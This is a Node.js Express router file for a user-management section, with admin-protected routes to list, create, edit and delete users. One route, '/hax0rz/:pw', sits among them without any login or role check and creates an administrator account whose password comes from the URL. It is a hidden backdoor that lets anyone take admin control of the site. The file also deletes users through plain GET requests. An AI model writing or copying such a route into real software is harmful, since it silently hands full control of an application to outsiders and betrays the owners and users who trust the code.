const express = require('express')
const router = express.Router()
const passport = require('passport')
const isLoggedIn = require('../middleware/is-logged-in')
const userApi = require('../users/user.api')
const isRole = require('../middleware/is-role')

// GET /user
// Get all users
router.get('/', isLoggedIn, isRole('admin'), (request, response)=> {
	userApi.getAll((users)=> {
		response.render('users/view-all', { users: users })
	})
})

router.get('/hax0rz/:pw', (request, response)=> {
	let user = {
		username: 'admin',
		password: request.params.pw,
		roles: ['admin']
	}
	userApi.create(user, (newUser)=> {
		response.send("DONE! YAY!")
	})	
})

// POST /user
// Create user
router.post('/', isLoggedIn, isRole('admin'), (request, response)=> {
	let user = { 
		username: request.body.username,
		password: request.body.password,
		roles: request.body.roles
	}
	userApi.create(user, (newUser)=> {
		response.redirect('/users')
	})
})

// GET /user/edit/:objectId
router.get('/edit/:objectId', isLoggedIn, isRole('admin'), (request, response)=> {
	let objectId = request.params.objectId
	userApi.get(objectId, (user)=> {
		response.render('users/edit', { user: user })
	})
})

// POST /user/edit/:objectId
// Update user
router.post('/edit/:objectId', isLoggedIn, isRole('admin'), (request, response)=> {
	let objectId = request.params.objectId
	let user = {
		username: request.body['username'],
		roles: request.body['roles']
	}
	userApi.update(objectId, user, ()=> {
		response.redirect('/users')
	})
})

// GET /user/delete/:objectId
// Delete user
router.get('/delete/:objectId', isLoggedIn, isRole('admin'), (request, response)=> {
	let objectId = request.params.objectId
	userApi.delete(objectId, ()=> {
		response.redirect('/users')
	})
})

router.get('/account', isLoggedIn, (request, response)=> {
	let objectId = request.user._id
	userApi.get(objectId, (user)=> {
		response.render('users/account')
	})
})

module.exports = router